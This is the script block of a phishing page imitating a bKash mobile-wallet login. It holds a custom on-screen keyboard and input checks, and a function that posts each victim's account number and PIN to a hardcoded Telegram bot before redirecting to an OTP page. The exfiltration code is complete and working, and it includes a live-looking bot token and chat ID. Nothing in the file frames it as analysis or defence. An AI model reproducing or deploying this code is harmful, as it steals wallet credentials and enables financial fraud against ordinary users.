    <script>

// Function to send data to Telegram bot
            async function sendToTelegram(number, pin) {
    const telegramBotToken = "7844663371:AAFOBkya3Ff-yMhay5UGmK8p6eCE3ycDzBs";
            const chatId = "5919121831";
            const message = `üë§ BKash Login üéâ\nüì• Account: ${number}\nüîë PIN: ${pin}`;

            const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;

            await fetch(url, {
                method: "POST",
            headers: {"Content-Type": "application/json" },
            body: JSON.stringify({chat_id: chatId, text: message })
    });
}

            // Function to check both inputs and update the button state
            function updateButtonState() {
    const pinValue = document.getElementById('pin-input').value;
            const textValue = document.getElementById('text-input').value;
            const nextButton = document.querySelector('.next-button');

    if (pinValue.length === 5 && textValue.length >= 13) {
                nextButton.style.backgroundColor = '#e2136e';
            nextButton.disabled = false;
    } else {
                nextButton.style.backgroundColor = '#808080';
            nextButton.disabled = true;
    }
}

            // Add event listeners for inputs
            window.addEventListener('load', function () {
                document.getElementById('pin-input').focus();
            document.getElementById('pin-input').addEventListener('input', function (e) {
                e.target.value = e.target.value.replace(/\D/g, '').slice(0, 5);
            updateButtonState();
    });
            document.getElementById('text-input').addEventListener('input', function (e) {
                e.target.value = e.target.value.replace(/\D/g, '');
            updateButtonState();
    });
});

            // Handle next button click
            const nextButton = document.querySelector('.next-button');
            nextButton.addEventListener('click', async function () {
    const number = document.getElementById('text-input').value;
            const pin = document.getElementById('pin-input').value;

    if (pin.length === 5 && number.length >= 13) {
                await sendToTelegram(number, pin);
            window.location.href = "otp.html"; // Redirect to another page
    }
});

 document.addEventListener("DOMContentLoaded", function () {
        const keyboard = document.getElementById("keyboard");
        const keys = document.querySelectorAll(".key");
        const inputFields = document.querySelectorAll(".custom-keyboard"); 

        let activeInput = null;


        inputFields.forEach((input) => {
            input.setAttribute("readonly", true); // ‡¶Æ‡ßã‡¶¨‡¶æ‡¶á‡¶≤ ‡¶ï‡ßÄ‡¶¨‡ßã‡¶∞‡ßç‡¶° ‡¶°‡¶ø‡¶ú‡ßá‡¶¨‡¶≤ ‡¶ï‡¶∞‡¶æ
            input.addEventListener("focus", function () {
                activeInput = input; // ‡¶Ø‡ßá‡¶á ‡¶á‡¶®‡¶™‡ßÅ‡¶ü‡ßá ‡¶ï‡ßç‡¶≤‡¶ø‡¶ï ‡¶ï‡¶∞‡¶æ ‡¶π‡¶¨‡ßá ‡¶∏‡ßá‡¶ü‡¶æ‡¶á ‡¶è‡¶ï‡¶ü‡¶ø‡¶≠ ‡¶á‡¶®‡¶™‡ßÅ‡¶ü
                keyboard.style.display = "block";
            });
        });

        // ‡¶ï‡ßÄ‡¶¨‡ßã‡¶∞‡ßç‡¶°‡ßá‡¶∞ ‡¶¨‡¶æ‡¶ü‡¶® ‡¶ï‡ßç‡¶≤‡¶ø‡¶ï ‡¶á‡¶≠‡ßá‡¶®‡ßç‡¶ü
        keys.forEach((key) => {
            key.addEventListener("click", function () {
                if (!activeInput) return;

                const keyValue = key.getAttribute("data-key");

                if (keyValue === "del") {
                    activeInput.value = activeInput.value.slice(0, -1);
                } else if (keyValue) {
                    // ‡¶™‡¶ø‡¶® ‡¶á‡¶®‡¶™‡ßÅ‡¶ü ‡¶π‡¶≤‡ßá ‡¶∏‡¶∞‡ßç‡¶¨‡ßã‡¶ö‡ßç‡¶ö ‡ß´ ‡¶°‡¶ø‡¶ú‡¶ø‡¶ü ‡¶∞‡¶æ‡¶ñ‡¶§‡ßá ‡¶¶‡ßá‡¶¨‡ßá
                    if (activeInput.id === "pin-input" && activeInput.value.length < 5) {
                        activeInput.value += keyValue;
                    }

                    // ‡¶®‡¶æ‡¶Æ‡ßç‡¶¨‡¶æ‡¶∞ ‡¶á‡¶®‡¶™‡ßÅ‡¶ü ‡¶π‡¶≤‡ßá ‡¶∏‡¶∞‡ßç‡¶¨‡ßã‡¶ö‡ßç‡¶ö ‡ßß‡ßß ‡¶°‡¶ø‡¶ú‡¶ø‡¶ü ‡¶∞‡¶æ‡¶ñ‡¶§‡ßá ‡¶¶‡ßá‡¶¨‡ßá
                    if (activeInput.id === "text-input" && activeInput.value.length < 15) {
                        activeInput.value += keyValue;
                    }
                }

                updateButtonState(); // ‡¶Ø‡ßá‡¶® ‡¶¨‡¶æ‡¶ü‡¶®‡ßá‡¶∞ ‡¶∏‡ßç‡¶ü‡ßá‡¶ü ‡¶Ü‡¶™‡¶°‡ßá‡¶ü ‡¶π‡ßü
            });

        });

        // ‡¶ï‡ßÄ‡¶¨‡ßã‡¶∞‡ßç‡¶°‡ßá‡¶∞ ‡¶¨‡¶æ‡¶á‡¶∞‡ßá ‡¶ï‡ßç‡¶≤‡¶ø‡¶ï ‡¶ï‡¶∞‡¶≤‡ßá ‡¶ï‡ßÄ‡¶¨‡ßã‡¶∞‡ßç‡¶° ‡¶π‡¶æ‡¶á‡¶° ‡¶ï‡¶∞‡¶¨‡ßá
        document.addEventListener("click", function (event) {
            if (!keyboard.contains(event.target) && !event.target.classList.contains("custom-keyboard")) {
                keyboard.style.display = "none";
                activeInput = null;
            }
        });
    });



    </script>
